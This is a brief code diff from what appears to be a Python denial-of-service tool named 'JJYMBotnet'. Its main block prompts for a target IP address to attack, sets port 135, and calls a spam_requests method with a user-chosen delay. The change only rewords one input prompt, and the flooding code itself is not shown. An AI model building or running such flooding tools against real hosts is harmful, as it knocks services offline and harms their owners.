@@ -53,7 +53,7 @@ class JJYMBotnet():
 
 if __name__ == "__main__":
     inIP = input("Enter an IP Address for the bot to attack: ")
-    speed = input("Enter delay between HTTP SYN requests: ")
+    speed = input("Enter delay between requests: ")
     dos = JJYMBotnet(inIP, 135, 200)
     dos.spam_requests(float(speed))
 
